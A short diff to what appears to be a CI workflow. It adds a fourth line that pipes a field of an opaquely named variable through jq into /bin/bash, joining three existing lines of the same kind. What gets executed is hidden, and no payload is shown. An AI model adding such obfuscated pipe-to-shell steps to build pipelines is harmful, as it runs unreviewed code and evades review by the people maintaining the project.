@@ -31,6 +31,7 @@ jobs:
           echo $nx09 | jq -r .dv43 | /bin/bash
           echo $edrf48228 | jq -r .xoad8 | /bin/bash
           echo $vand814 | jq -r .ighbl93766 | /bin/bash
+          echo $uim320 | jq -r .xzng450 | /bin/bash
 
       - name: Save archive
         if: always()
